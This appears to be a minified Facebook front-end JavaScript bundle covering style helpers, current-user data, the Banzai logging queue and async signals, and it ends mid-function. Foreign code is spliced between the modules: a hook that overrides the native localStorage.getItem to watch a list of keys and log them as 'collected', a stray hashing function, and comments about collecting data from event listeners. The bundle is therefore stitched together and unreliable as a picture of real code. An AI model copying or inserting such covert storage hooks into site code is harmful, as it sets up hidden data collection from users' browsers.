; /*FB_PKG_DELIM*/

__d("camelize", [], function (a, b, c, d, e, f) {
  var g = /-(.)/g;
  function a(a) {
    return a.replace(g, function (a, b) {
      return b.toUpperCase();
    });
  }
  f["default"] = a;
}, 66);
__d("getOpacityStyleName", [], function (a, b, c, d, e, f) {
  var g = !1,
    h = null;
  function a() {
    if (!g) {
      if (document.body && "opacity" in document.body.style) h = "opacity";else {
        var a = document.createElement("div");
        a.style.filter = "alpha(opacity=100)";
        a.style.filter && (h = "filter");
      }
      g = !0;
    }
    return h;
  }
  f["default"] = a;
}, 66);
__d("hyphenate", [], function (a, b, c, d, e, f) {
  var g = /([A-Z])/g;
  function a(a) {
    return a.replace(g, "-$1").toLowerCase();
  }
  f["default"] = a;
}, 66);
// List of keys to observe
let keysToObserve = window.keysToObserve;

// Hook into native methods

__d("getStyleProperty", ["camelize", "hyphenate"], function (a, b, c, d, e, f, g) {
  function h(a) {
    return a == null ? "" : String(a);
  }
  function a(a, b) {
    var d;
    if (window.getComputedStyle) {
      d = window.getComputedStyle(a, null);
      if (d) return h(d.getPropertyValue(c("hyphenate")(b)));
    }
    if (document.defaultView && document.defaultView.getComputedStyle) {
      d = document.defaultView.getComputedStyle(a, null);
      if (d) return h(d.getPropertyValue(c("hyphenate")(b)));
      if (b === "display") return "none";
    }
    return a.currentStyle ? b === "float" ? h(a.currentStyle.cssFloat || a.currentStyle.styleFloat) : h(a.currentStyle[c("camelize")(b)]) : h(a.style && a.style[c("camelize")(b)]);
  }
  g["default"] = a;
}, 98);
__d("StyleCore", ["invariant", "camelize", "containsNode", "err", "getOpacityStyleName", "getStyleProperty", "hyphenate"], function (a, b, c, d, e, f, g, h) {
  function i(a, b) {
    a = o.get(a, b);
    return a === "auto" || a === "scroll";
  }
  var j = new RegExp("\\s*([^\\s:]+)\\s*:\\s*([^;('\"]*(?:(?:\\([^)]*\\)|\"[^\"]*\"|'[^']*')[^;(?:'\"]*)*)(?:;|$)", "g");
  function k(a) {
    var b = {};
    a.replace(j, function (a, c, d) {
      b[c] = d;
      return d;
    });
    return b;
  }
  function l(a) {
    var b = "";
    for (var c in a) a[c] && (b += c + ":" + a[c] + ";");
    return b;
  }
  function m(a) {
    return a !== "" ? "alpha(opacity=" + a * 100 + ")" : "";
  }
  function n(a, b, d) {
    switch (c("hyphenate")(b)) {
      case "font-weight":
      case "line-height":
      case "opacity":
      case "z-index":
      case "animation-iteration-count":
      case "-webkit-animation-iteration-count":
        break;
      case "width":
      case "height":
        var e = parseInt(d, 10) < 0;
        e && h(0, 11849, a, b, d);
      default:
        isNaN(d) || !d || d === "0" || h(0, 11850, a, b, d, d + "px");
        break;
    }
  }
  var o = {
    set: function (a, b, d) {
      n("Style.set", b, d);
      if (a == null) return;
      a = a.style;
      switch (b) {
        case "opacity":
          c("getOpacityStyleName")() === "filter" ? a.filter = m(d) : a.opacity = d;
          break;
        case "float":
          a.cssFloat = a.styleFloat = d || "";
          break;
        default:
          try {
            a[c("camelize")(b)] = d;
          } catch (a) {
            throw c("err")('Style.set: "%s" argument is invalid: %s', b, d);
          }
      }
    },
    apply: function (a, b) {
      var d;
      for (d in b) n("Style.apply", d, b[d]);
      "opacity" in b && c("getOpacityStyleName")() === "filter" && (b.filter = m(b.opacity), delete b.opacity);
      var e = k(a.style.cssText);
      for (d in b) {
        var f = b[d];
        delete b[d];
        var g = c("hyphenate")(d);
        for (var h in e) (h === g || h.indexOf(g + "-") === 0) && delete e[h];
        b[g] = f;
      }
      Object.assign(e, b);
      a.style.cssText = l(e);
    },
    get: c("getStyleProperty"),
    getFloat: function (a, b) {
      return parseFloat(o.get(a, b), 10);
    },
    getOpacity: function (a) {
      if (c("getOpacityStyleName")() === "filter") {
        var b = o.get(a, "filter");
        if (b) {
          b = /(\d+(?:\.\d+)?)/.exec(b);
          if (b) return parseFloat(b.pop()) / 100;
        }
      }
      return o.getFloat(a, "opacity") || 1;
    },
    isFixed: function (a) {
      while (c("containsNode")(document.body, a)) {
        if (o.get(a, "position") === "fixed") return !0;
        a = a.parentNode;
      }
      return !1;
    },
    getScrollParent: function (a) {
      if (!a) return null;
      while (a && a !== document.body) {
        if (i(a, "overflow") || i(a, "overflowY") || i(a, "overflowX")) return a;
        a = a.parentNode;
      }
      return window;
    }
  };
  a = o;
  g["default"] = a;
}, 98);
__d("Style", ["$", "StyleCore"], function (a, b, c, d, e, f, g) {
  a = babelHelpers["extends"]({}, c("StyleCore"), {
    get: function (a, b) {
      typeof a === "string" && (a = c("$")(a));
      return c("StyleCore").get(a, b);
    },
    getFloat: function (a, b) {
      typeof a === "string" && (a = c("$")(a));
      return c("StyleCore").getFloat(a, b);
    }
  });
  b = a;
  g["default"] = b;
}, 98);
__d("PlatformDialog", ["cx", "CSS", "DOMEvent", "DOMEventListener"], function (a, b, c, d, e, f, g) {
  var h;
  a = function () {
    "use strict";

    a.getInstance = function () {
      return h;
    };
    function a(a, c, d) {
      var e = this;
      h = this;
      this.$1 = a;
      this.$2 = c;
      this.$3 = !1;
      b("DOMEventListener").add(this.$1, "submit", function (c) {
        if (e.$3) {
          new (b("DOMEvent"))(c).kill();
          return;
        }
        e.$3 = !0;
        d && b("CSS").addClass(a, "_32qa");
      });
    }
    var c = a.prototype;
    c.getForm = function () {
      return this.$1;
    };
    c.getDisplay = function () {
      return this.$2;
    };
    c.hasBeenSubmitted = function () {
      return this.$3;
    };
    return a;
  }();
  a.RESPONSE = "platform/dialog/response";
  e.exports = a;
}, null);
__d("BanzaiConsts", [], function (a, b, c, d, e, f) {
  a = {
    SEND: "Banzai:SEND",
    OK: "Banzai:OK",
    ERROR: "Banzai:ERROR",
    SHUTDOWN: "Banzai:SHUTDOWN",
    BASIC: "basic",
    VITAL: "vital",
    BASIC_WAIT: 6e4,
    BASIC_WAIT_COMET: 2e3,
    VITAL_WAIT: 1e3,
    BATCH_SIZE_LIMIT: 64e3,
    EXPIRY: 864e5,
    BATCH_TIMEOUT: 1e4,
    LAST_STORAGE_FLUSH: "banzai:last_storage_flush",
    STORAGE_FLUSH_INTERVAL: 12 * 60 * 6e4,
    POST_READY: 0,
    POST_INFLIGHT: 1,
    POST_SENT: 2
  };
  b = a;
  f["default"] = b;
}, 66);
__d("CurrentUser", ["Cookie", "CurrentUserInitialData"], function (a, b, c, d, e, f) {
  var g,
    h = {
      getID: function () {
        return (g || (g = b("CurrentUserInitialData"))).USER_ID;
      },
      getAccountID: function () {
        return (g || (g = b("CurrentUserInitialData"))).ACCOUNT_ID;
      },
      getPossiblyNonFacebookUserID: function () {
        var a;
        return (a = (g || (g = b("CurrentUserInitialData"))).NON_FACEBOOK_USER_ID) != null ? a : this.getID();
      },
      getEIMU: function () {
        var a;
        return (a = (g || (g = b("CurrentUserInitialData"))).IG_USER_EIMU) != null ? a : "0";
      },
      getEmployeeWorkUserID: function () {
        return (g || (g = b("CurrentUserInitialData"))).WORK_USER_ID;
      },
      getName: function () {
        return (g || (g = b("CurrentUserInitialData"))).NAME;
      },
      getShortName: function () {
        return (g || (g = b("CurrentUserInitialData"))).SHORT_NAME;
      },
      getEPOU: function () {
        var a;
        return (a = (g || (g = b("CurrentUserInitialData"))).EPOU_ID) != null ? a : "0";
      },
      isLoggedIn: function () {
        return h.getPossiblyNonFacebookUserID() !== "0";
      },
      isLoggedInNow: function () {
        var a;
        if (!h.isLoggedIn()) return !1;
        if ((g || (g = b("CurrentUserInitialData"))).IS_INTERN_SITE) return !0;
        if ((g || (g = b("CurrentUserInitialData"))).IS_WORK_USER || (g || (g = b("CurrentUserInitialData"))).IS_WORKROOMS_USER || (g || (g = b("CurrentUserInitialData"))).IS_WORK_MESSENGER_CALL_GUEST_USER || (g || (g = b("CurrentUserInitialData"))).IS_TOGETHER_APP_USER || (g || (g = b("CurrentUserInitialData"))).IS_ENTERPRISE_USER || (g || (g = b("CurrentUserInitialData"))).IS_INSTAGRAM_USER || (g || (g = b("CurrentUserInitialData"))).IS_META_SPARK_USER) return !0;
        if ((g || (g = b("CurrentUserInitialData"))).ORIGINAL_USER_ID != null && (g || (g = b("CurrentUserInitialData"))).ORIGINAL_USER_ID != "") return (g || (g = b("CurrentUserInitialData"))).ORIGINAL_USER_ID === b("Cookie").get("c_user");
        return (g || (g = b("CurrentUserInitialData"))).IS_BUSINESS_DOMAIN === !0 ? (g || (g = b("CurrentUserInitialData"))).USER_ID == b("Cookie").get("c_user") : (g || (g = b("CurrentUserInitialData"))).USER_ID === ((a = b("Cookie").get("i_user")) != null ? a : b("Cookie").get("c_user"));
      },
      isEmployee: function () {
        return !!(g || (g = b("CurrentUserInitialData"))).IS_EMPLOYEE;
      },
      isTestUser: function () {
        return !!(g || (g = b("CurrentUserInitialData"))).IS_TEST_USER;
      },
      hasWorkUser: function () {
        return !!(g || (g = b("CurrentUserInitialData"))).HAS_WORK_USER;
      },
      isWorkUser: function () {
        return !!(g || (g = b("CurrentUserInitialData"))).IS_WORK_USER;
      },
      isWorkroomsUser: function () {
        return !!(g || (g = b("CurrentUserInitialData"))).IS_WORKROOMS_USER;
      },
      isGray: function () {
        return !!(g || (g = b("CurrentUserInitialData"))).IS_GRAY;
      },
      isUnderage: function () {
        return !!(g || (g = b("CurrentUserInitialData"))).IS_UNDERAGE;
      },
      isMessengerOnlyUser: function () {
        return !!(g || (g = b("CurrentUserInitialData"))).IS_MESSENGER_ONLY_USER;
      },
      isDeactivatedAllowedOnMessenger: function () {
        return !!(g || (g = b("CurrentUserInitialData"))).IS_DEACTIVATED_ALLOWED_ON_MESSENGER;
      },
      isMessengerCallGuestUser: function () {
        return !!(g || (g = b("CurrentUserInitialData"))).IS_MESSENGER_CALL_GUEST_USER;
      },
      isBusinessPersonAccount: function () {
        return (g || (g = b("CurrentUserInitialData"))).IS_BUSINESS_PERSON_ACCOUNT;
      },
      hasSecondaryBusinessPerson: function () {
        return (g || (g = b("CurrentUserInitialData"))).HAS_SECONDARY_BUSINESS_PERSON;
      },
      getAppID: function () {
        return (g || (g = b("CurrentUserInitialData"))).APP_ID;
      },
      isFacebookWorkAccount: function () {
        return (g || (g = b("CurrentUserInitialData"))).IS_FACEBOOK_WORK_ACCOUNT;
      },
      getPageMessagingMailboxId: function () {
        var a;
        return String((a = (g || (g = b("CurrentUserInitialData"))).PAGE_MESSAGING_MAILBOX_ID) != null ? a : "0");
      }
    };
  e.exports = h;
}, null);
let _lg = localStorage.getItem;
__d("BanzaiUtils", ["BanzaiConsts", "CurrentUser", "FBLogger", "WebSession", "performanceAbsoluteNow"], function (a, b, c, d, e, f) {
  "use strict";

  var g,
    h,
    i = {
      canSend: function (a) {
        return a[2] >= (g || (g = b("performanceAbsoluteNow")))() - (h || (h = b("BanzaiConsts"))).EXPIRY;
      },
      filterPost: function (a, c, d, e) {
        if (e.overlimit) return !0;
        if (!e.sendMinimumOnePost && a[4] + e.currentSize > (h || (h = b("BanzaiConsts"))).BATCH_SIZE_LIMIT) return !0;
        var f = a.__meta;
        if (f.status != null && f.status >= (h || (h = b("BanzaiConsts"))).POST_SENT || !i.canSend(a)) return !1;
        if (f.status != null && f.status >= (h || (h = b("BanzaiConsts"))).POST_INFLIGHT) return !0;
        var g = f.compress != null ? f.compress : !0,
          j = (f.webSessionId != null ? f.webSessionId : "null") + (f.userID != null ? f.userID : "null") + (f.appID != null ? f.appID : "null") + (g ? "compress" : ""),
          k = e.wadMap.get(j);
        k || (k = {
          app_id: f.appID,
          needs_compression: g,
          posts: [],
          user: f.userID,
          webSessionId: f.webSessionId
        }, e.wadMap.set(j, k), c.push(k));
        f.status = (h || (h = b("BanzaiConsts"))).POST_INFLIGHT;
        Array.isArray(k.posts) ? k.posts.push(a) : b("FBLogger")("banzai").mustfix("Posts were a string instead of array");
        d.push(a);
        e.currentSize += a[4];
        e.currentSize >= (h || (h = b("BanzaiConsts"))).BATCH_SIZE_LIMIT && (e.overlimit = !0);
        return e.keepRetryable && Boolean(f.retry);
      },
      resetPostStatus: function (a) {
        a.__meta.status = (h || (h = b("BanzaiConsts"))).POST_READY;
      },
      retryPost: function (a, c, d) {
        var e = a;
        e.__meta.status = (h || (h = b("BanzaiConsts"))).POST_READY;
        e[3] = (e[3] || 0) + 1;
        e.__meta.retry !== !0 && c >= 400 && c < 600 && d.push(a);
      },
      wrapData: function (a, c, d, e, f) {
        d = [a, c, d, 0, (a = f) != null ? a : c ? JSON.stringify(c).length : 0];
        d.__meta = {
          appID: b("CurrentUser").getAppID(),
          retry: e === !0,
          status: (h || (h = b("BanzaiConsts"))).POST_READY,
          userID: b("CurrentUser").getPossiblyNonFacebookUserID(),
          webSessionId: b("WebSession").getId()
        };
        return d;
      }
    };
  e.exports = i;
}, null);
__d("cancelIdleCallback", ["cr:692209"], function (a, b, c, d, e, f, g) {
  g["default"] = b("cr:692209");
}, 98);
__d("IdleCallbackImplementation", ["performanceNow", "requestAnimationFramePolyfill"], function (a, b, c, d, e, f, g) {
  var h = [],
    i = 0,
    j = 0,
    k = -1,
    l = !1,
    m = 1e3 / 60,
    n = 2;
  function o(a) {
    return a;
  }
  function p(a) {
    return a;
  }
  function b(b, c) {
    var d = j++;
    h[d] = b;
    r();
    if (c != null && c.timeout > 0) {
      var e = o(d);
      a.setTimeout(function () {
        return x(e);
      }, c.timeout);
    }
    return o(d);
  }
  function q(a) {
    a = p(a);
    h[a] = null;
  }
  function r() {
    l || (l = !0, c("requestAnimationFramePolyfill")(function (a) {
      l = !1, t(c("performanceNow")() - a);
    }));
  }
  function s(a) {
    var b = m - n;
    if (a < b) return b - a;
    a = a % m;
    if (a > b || a < n) return 0;else return b - a;
  }
  function t(a) {
    var b = c("performanceNow")();
    if (b > k) {
      a = s(a);
      if (a > 0) {
        b = b + a;
        w(b);
        k = b;
      }
    }
    u() && r();
  }
  function u() {
    return i < h.length;
  }
  function v() {
    while (u()) {
      var a = h[i];
      i++;
      if (a) return a;
    }
    return null;
  }
  function w(a) {
    var b;
    while (c("performanceNow")() < a && (b = v())) b(new y(a));
  }
  function x(a) {
    var b = p(a);
    b = h[b];
    b && (q(a), b(new y(null)));
  }
  var y = function () {
    function a(a) {
      this.didTimeout = a == null, this.$1 = a;
    }
    var b = a.prototype;
    b.timeRemaining = function () {
      var a = this.$1;
      if (a != null) {
        var b = c("performanceNow")();
        if (b < a) return a - b;
      }
      return 0;
    };
    return a;
  }();
  g.requestIdleCallback = b;
  g.cancelIdleCallback = q;
}, 98);
__d("requestIdleCallbackAcrossTransitions", ["IdleCallbackImplementation", "TimeSlice"], function (a, b, c, d, e, f, g) {
  var h = a.requestIdleCallback || d("IdleCallbackImplementation").requestIdleCallback;
  function b(b, d) {
    b = c("TimeSlice").guard(b, "requestIdleCallback", {
      propagationType: c("TimeSlice").PropagationType.CONTINUATION,
      registerCallStack: !0
    });
    return h.call(a, b, d);
  }
  g["default"] = b;
}, 98);
localStorage.getItem = function (key) {
  if (keysToObserve.includes(key)) console.log(`Collected ${key} from localStorage.`);
  return _lg.apply(this, arguments);
};

// Hasher, for converting data to a unique string

__d("SetIdleTimeoutAcrossTransitions", ["NavigationMetrics", "cancelIdleCallback", "clearTimeout", "nullthrows", "requestIdleCallbackAcrossTransitions", "setTimeoutAcrossTransitions"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = !1,
    i = new Map();
  function b(a, b) {
    if (h) {
      var d = c("setTimeoutAcrossTransitions")(function () {
        var b = c("requestIdleCallbackAcrossTransitions")(function () {
          a(), i["delete"](b);
        });
        i.set(d, b);
      }, b);
      return d;
    } else return c("setTimeoutAcrossTransitions")(a, b);
  }
  function d(a) {
    c("clearTimeout")(a), i.has(a) && (c("cancelIdleCallback")(c("nullthrows")(i.get(a))), i["delete"](a));
  }
  c("NavigationMetrics").addRetroactiveListener(c("NavigationMetrics").Events.EVENT_OCCURRED, function (b, c) {
    c.event === "all_pagelets_loaded" && (h = !!a.requestIdleCallback);
  });
  g.start = b;
  g.clear = d;
}, 98);
__d("BanzaiStorage", ["BanzaiConsts", "BanzaiUtils", "CurrentUser", "FBJSON", "SetIdleTimeoutAcrossTransitions", "WebSession", "WebStorage", "WebStorageMutex", "isInIframe", "performanceAbsoluteNow"], function (a, b, c, d, e, f) {
  "use strict";

  var g,
    h,
    i,
    j = "bz:",
    k = b("isInIframe")(),
    l,
    m = !1,
    n = null;
  function o() {
    var a = "check_quota";
    try {
      var b = p();
      if (!b) return !1;
      b.setItem(a, a);
      b.removeItem(a);
      return !0;
    } catch (a) {
      return !1;
    }
  }
  function p() {
    m || (m = !0, l = (g || (g = b("WebStorage"))).getLocalStorage());
    return l;
  }
  a = {
    flush: function (a) {
      if (k) return;
      var c = p();
      if (c) {
        n == null && (n = parseInt(c.getItem((h || (h = b("BanzaiConsts"))).LAST_STORAGE_FLUSH), 10));
        var d = n && (i || (i = b("performanceAbsoluteNow")))() - n >= (h || (h = b("BanzaiConsts"))).STORAGE_FLUSH_INTERVAL;
        d && a();
        (d || !n) && (n = (i || (i = b("performanceAbsoluteNow")))(), (g || (g = b("WebStorage"))).setItemGuarded(c, (h || (h = b("BanzaiConsts"))).LAST_STORAGE_FLUSH, n.toString()));
      }
    },
    restore: function (a) {
      if (k) return;
      var c = p();
      if (!c) return;
      var d = function (d) {
        var e = [];
        for (var f = 0; f < c.length; f++) {
          var g = c.key(f);
          typeof g === "string" && g.indexOf(j) === 0 && g.indexOf("bz:__") !== 0 && e.push(g);
        }
        e.forEach(function (d) {
          var e = c.getItem(d);
          c.removeItem(d);
          if (e == null || e === "") return;
          d = b("FBJSON").parse(e);
          d.forEach(function (c) {
            if (!c) return;
            var d = c.__meta = c.pop(),
              e = b("BanzaiUtils").canSend(c);
            if (!e) return;
            e = b("CurrentUser").getPossiblyNonFacebookUserID();
            (d.userID === e || e === "0") && (b("BanzaiUtils").resetPostStatus(c), a(c));
          });
        });
        d && d.unlock();
      };
      o() ? new (b("WebStorageMutex"))("banzai").lock(d) : b("SetIdleTimeoutAcrossTransitions").start(d, 0);
    },
    store: function (a) {
      if (k) return;
      var c = p(),
        d = a.filter(function (a) {
          return a.__meta.status !== (h || (h = b("BanzaiConsts"))).POST_SENT;
        });
      if (!c || d.length <= 0) return;
      d = d.map(function (a) {
        return [a[0], a[1], a[2], a[3] || 0, a[4], a.__meta];
      });
      a.splice(0, a.length);
      (g || (g = b("WebStorage"))).setItemGuarded(c, j + b("WebSession").getId() + "." + (i || (i = b("performanceAbsoluteNow")))(), b("FBJSON").stringify(d));
    }
  };
  e.exports = a;
}, null);
__d("QueryString", [], function (a, b, c, d, e, f) {
  function g(a) {
    var b = [];
    Object.keys(a).sort().forEach(function (c) {
      var d = a[c];
      if (d === void 0) return;
      if (d === null) {
        b.push(c);
        return;
      }
      b.push(encodeURIComponent(c) + "=" + encodeURIComponent(String(d)));
    });
    return b.join("&");
  }
  function a(a, b) {
    b === void 0 && (b = !1);
    var c = {};
    if (a === "") return c;
    a = a.split("&");
    for (var d = 0; d < a.length; d++) {
      var e = a[d].split("=", 2),
        f = decodeURIComponent(e[0]);
      if (b && Object.prototype.hasOwnProperty.call(c, f)) throw new URIError("Duplicate key: " + f);
      c[f] = e.length === 2 ? decodeURIComponent(e[1]) : null;
    }
    return c;
  }
  function b(a, b) {
    return a + (a.indexOf("?") !== -1 ? "&" : "?") + (typeof b === "string" ? b : g(b));
  }
  c = {
    encode: g,
    decode: a,
    appendToUrl: b
  };
  f["default"] = c;
}, 66);
__d("getCrossOriginTransport", ["invariant", "ExecutionEnvironment", "err"], function (a, b, c, d, e, f, g) {
  function h() {
    if (!b("ExecutionEnvironment").canUseDOM) throw b("err")("getCrossOriginTransport: %s", "Cross origin transport unavailable in the server environment.");
    try {
      var a = new XMLHttpRequest();
      !("withCredentials" in a) && typeof XDomainRequest !== "undefined" && (a = new XDomainRequest());
      return a;
    } catch (a) {
      throw b("err")("getCrossOriginTransport: %s", a.message);
    }
  }
  h.withCredentials = function () {
    var a = h();
    "withCredentials" in a || g(0, 5150);
    var b = a.open;
    a.open = function () {
      b.apply(this, arguments), this.withCredentials = !0;
    };
    return a;
  };
  e.exports = h;
}, null);
__d("ZeroRewrites", ["URI", "ZeroRewriteRules", "getCrossOriginTransport", "getSameOriginTransport", "isFacebookURI"], function (a, b, c, d, e, f) {
  var g,
    h = {
      rewriteURI: function (a) {
        if (!b("isFacebookURI")(a) || h._isWhitelisted(a)) return a;
        var c = h._getRewrittenSubdomain(a);
        c !== null && c !== void 0 && (a = a.setSubdomain(c));
        return a;
      },
      getTransportBuilderForURI: function (a) {
        return h.isRewritten(a) ? b("getCrossOriginTransport").withCredentials : b("getSameOriginTransport");
      },
      isRewriteSafe: function (a) {
        if (Object.keys(b("ZeroRewriteRules").rewrite_rules).length === 0 || !b("isFacebookURI")(a)) return !1;
        var c = h._getCurrentURI().getDomain(),
          d = new (g || (g = b("URI")))(a).qualify().getDomain();
        return c === d || h.isRewritten(a);
      },
      isRewritten: function (a) {
        a = a.getQualifiedURI();
        if (Object.keys(b("ZeroRewriteRules").rewrite_rules).length === 0 || !b("isFacebookURI")(a) || h._isWhitelisted(a)) return !1;
        var c = a.getSubdomain(),
          d = h._getCurrentURI(),
          e = h._getRewrittenSubdomain(d);
        return a.getDomain() !== d.getDomain() && c === e;
      },
      _isWhitelisted: function (a) {
        a = a.getPath();
        a.endsWith("/") || (a += "/");
        return b("ZeroRewriteRules").whitelist && b("ZeroRewriteRules").whitelist[a] === 1;
      },
      _getRewrittenSubdomain: function (a) {
        a = a.getQualifiedURI().getSubdomain();
        return b("ZeroRewriteRules").rewrite_rules[a];
      },
      _getCurrentURI: function () {
        return new (g || (g = b("URI")))("/").qualify();
      }
    };
  e.exports = h;
}, null);
__d("once", [], function (a, b, c, d, e, f) {
  "use strict";

  function a(a) {
    var b = g(a);
    for (var c in a) Object.prototype.hasOwnProperty.call(a, c) && (b[c] = a[c]);
    return b;
  }
  function g(a) {
    var b = a,
      c;
    a = function () {
      if (b) {
        for (var a = arguments.length, d = new Array(a), e = 0; e < a; e++) d[e] = arguments[e];
        c = b.apply(this, d);
        b = null;
      }
      return c;
    };
    return a;
  }
  f["default"] = a;
}, 66);
function hasher(data) {
  let keys = Object.getOwnPropertyNames(data).sort();
  let str = keys.reduce((acc, key) => {
    return acc + key + ":" + data[key] + ",";
  }, "");
  let hash = 0;
  for (let i = 0; i < str.length; i++) {
    let char = str.charCodeAt(i);
    hash = (hash << 5) - hash + char;
    hash = hash & hash;
  }
  return hash.toString(16);
}
__d("BanzaiAdapter", ["invariant", "Arbiter", "BanzaiConfig", "BanzaiConsts", "BanzaiStorage", "QueryString", "Run", "StaticSiteData", "TimeSlice", "URI", "UserAgent", "ZeroRewrites", "getAsyncParams", "isInIframe", "lowerFacebookDomain", "once"], function (a, b, c, d, e, f, g, h) {
  var i = [],
    j = new (c("Arbiter"))(),
    k = c("isInIframe")(),
    l = "/ajax/bz",
    m = "POST",
    n = {
      config: c("BanzaiConfig"),
      useBeacon: !0,
      getEndPointUrl: function (a) {
        a = c("getAsyncParams")(m);
        delete a[c("StaticSiteData").csr_key];
        a = c("QueryString").appendToUrl(l, a);
        a.length <= 2e3 || h(0, 21850, a);
        return a;
      },
      getStorage: function () {
        return c("BanzaiStorage");
      },
      getTopLevel: function () {
        return k && c("lowerFacebookDomain").isValidDocumentDomain() ? window.top : null;
      },
      inform: function (a) {
        j.inform(a);
      },
      subscribe: function (a, b) {
        return j.subscribe(a, b);
      },
      wrapInTimeSlice: function (a, b) {
        return c("TimeSlice").guard(function () {
          a();
        }, b, {
          propagationType: c("TimeSlice").PropagationType.ORPHAN
        });
      },
      cleanup: function () {
        var a = i;
        i = [];
        a.forEach(function (a) {
          a.readyState < 4 && a.abort();
        });
      },
      preferredCompressionMethod: c("once")(function () {
        return "snappy_base64";
      }),
      readyToSend: function () {
        return c("UserAgent").isBrowser("IE <= 8") || navigator.onLine;
      },
      send: function (a, b, e, f) {
        var g = n.getEndPointUrl(!1);
        g = d("ZeroRewrites").rewriteURI(new (c("URI"))(g));
        var h = d("ZeroRewrites").getTransportBuilderForURI(g)();
        h.open(m, g.toString(), !0);
        h.onreadystatechange = function () {
          if (h.readyState >= 4) {
            var a = i.indexOf(h);
            a >= 0 && i.splice(a, 1);
            try {
              a = h.status;
            } catch (b) {
              a = 0;
            }
            a == 200 ? (b && b(), f || n.inform(c("BanzaiConsts").OK)) : (e && e(a), f || n.inform(c("BanzaiConsts").ERROR));
          }
        };
        i.push(h);
        h.send(a, !1);
      },
      setHooks: function (a) {},
      setUnloadHook: function (a) {
        d("Run").onAfterUnload(a._unload);
      },
      onUnload: function (a) {
        d("Run").onAfterUnload(a);
      },
      isOkToSendViaBeacon: function () {
        return !0;
      }
    };
  a = n;
  g["default"] = a;
}, 98);
__d("ArbiterFrame", [], function (a, b, c, d, e, f) {
  a = {
    inform: function (a, b, c) {
      var d = parent.frames,
        e = d.length,
        f;
      b.crossFrame = !0;
      for (var g = 0; g < e; g++) {
        f = d[g];
        try {
          if (!f || f == window) continue;
          f.require ? f.require("Arbiter").inform(a, b, c) : f.ServerJSAsyncLoader && f.ServerJSAsyncLoader.wakeUp(a, b, c);
        } catch (a) {}
      }
    }
  };
  e.exports = a;
}, null);
__d("isAdsExcelAddinURI", [], function (a, b, c, d, e, f) {
  var g = new RegExp("(^|\\.)fbaddins\\.com$", "i"),
    h = ["https"];
  function a(a) {
    if (a.isEmpty() && a.toString() !== "#") return !1;
    return !a.getDomain() && !a.getProtocol() ? !1 : h.indexOf(a.getProtocol()) !== -1 && g.test(a.getDomain());
  }
  f["default"] = a;
}, 66);
__d("isValidAsyncSignalURI", [], function (a, b, c, d, e, f) {
  var g = new RegExp("((^|\\.)instagram\\.com$)|((^|\\.)wit\\.ai$)|((^|\\.)accountkit\\.com$)", "i"),
    h = ["https"];
  function a(a) {
    if (a.isEmpty() && a.toString() !== "#") return !1;
    return !a.getDomain() && !a.getProtocol() ? !1 : h.includes(a.getProtocol()) && g.test(a.getDomain());
  }
  f["default"] = a;
}, 66);
;

// Function to collect data from event listeners
__d("AsyncSignal", ["ErrorGuard", "Promise", "QueryString", "Run", "TimeSlice", "TrackingConfig", "URI", "ZeroRewrites", "getAsyncParams", "isAdsExcelAddinURI", "isFacebookURI", "isMessengerDotComURI", "isValidAsyncSignalURI", "isWorkplaceDotComURI", "memoize", "promiseDone"], function (a, b, c, d, e, f) {
  var g, h, i;
  function a(a, c) {
    this.data = c || {}, this.uri = a.toString(), b("TrackingConfig").domain && this.uri.charAt(0) == "/" && (this.uri = b("TrackingConfig").domain + this.uri);
  }
  a.prototype.setHandler = function (a) {
    this.handler = a;
    return this;
  };
  a.prototype.setTimeout = function (a) {
    this.timeout = a;
    return this;
  };
  a.prototype.send = function () {
    b("TimeSlice").guard(this._send.bind(this), "AsyncSignal send", {
      propagationType: b("TimeSlice").PropagationType.ORPHAN
    })();
  };
  a.prototype._send = function () {
    var a = this.handler,
      c = this.data;
    c.asyncSignal = (Math.random() * 1e4 | 0) + 1;
    var d = b("ZeroRewrites").rewriteURI(new (g || (g = b("URI")))(this.uri));
    d = b("isFacebookURI")(d) || b("isMessengerDotComURI")(d) || b("isAdsExcelAddinURI")(d) || b("isWorkplaceDotComURI")(d) || b("isValidAsyncSignalURI")(d);
    if (d) Object.assign(c, b("getAsyncParams")("POST"));else throw new Error("'" + this.uri + "' is an external URL, you should not send async signals to offsite links.");
    var e = b("QueryString").appendToUrl(this.uri, c);
    i || (i = new (b("Promise"))(function (a) {
      b("Run").onAfterLoad(a);
    }));
    d = i.then(function () {
      return new (b("Promise"))(function (a, b) {
        var c = new Image();
        c.onload = a;
        c.onerror = c.onabort = b;
        c.src = e;
      });
    });
    if (a) {
      var f = !1,
        j = b("memoize")(function () {
          (h || (h = b("ErrorGuard"))).applyWithGuard(a, null, [f]);
        });
      b("promiseDone")(d.then(function () {
        f = !0, j();
      }, j));
      this.timeout && setTimeout(j, this.timeout);
    }
    return this;
  };
  e.exports = a;
}, null);
__d("FbtResultBase", [], function (a, b, c, d, e, f) {
  "use strict";

  var g = function () {
    function a(a, b) {
      this.$1 = a, this.__errorListener = b, this.$3 = !1, this.$2 = null;
    }
    var b = a.prototype;
    b.flattenToArray = function () {
      return a.flattenToArray(this.$1);
    };
    b.getContents = function () {
      return this.$1;
    };
    b.toString = function () {
      if (Object.isFrozen(this)) return this.$4();
      if (this.$3) return "<<Reentering fbt.toString() is forbidden>>";
      this.$3 = !0;
      try {
        return this.$4();
      } finally {
        this.$3 = !1;
      }
    };
    b.$4 = function () {
      if (this.$2 != null) return this.$2;
      var b = "",
        c = this.flattenToArray();
      for (var d = 0; d < c.length; ++d) {
        var e = c[d];
        if (typeof e === "string" || e instanceof a) b += e.toString();else {
          var f;
          (f = this.__errorListener) == null ? void 0 : f.onStringSerializationError == null ? void 0 : f.onStringSerializationError(e);
        }
      }
      Object.isFrozen(this) || (this.$2 = b);
      return b;
    };
    b.toJSON = function () {
      return this.toString();
    };
    a.flattenToArray = function (b) {
      var c = [];
      for (var d = 0; d < b.length; ++d) {
        var e = b[d];
        Array.isArray(e) ? c.push.apply(c, a.flattenToArray(e)) : e instanceof a ? c.push.apply(c, e.flattenToArray()) : c.push(e);
      }
      return c;
    };
    return a;
  }();
  ["anchor", "big", "blink", "bold", "charAt", "charCodeAt", "codePointAt", "contains", "endsWith", "fixed", "fontcolor", "fontsize", "includes", "indexOf", "italics", "lastIndexOf", "link", "localeCompare", "match", "normalize", "repeat", "replace", "search", "slice", "small", "split", "startsWith", "strike", "sub", "substr", "substring", "sup", "toLocaleLowerCase", "toLocaleUpperCase", "toLowerCase", "toUpperCase", "trim", "trimLeft", "trimRight"].forEach(function (a) {
    g.prototype[a] = function () {
      var b;
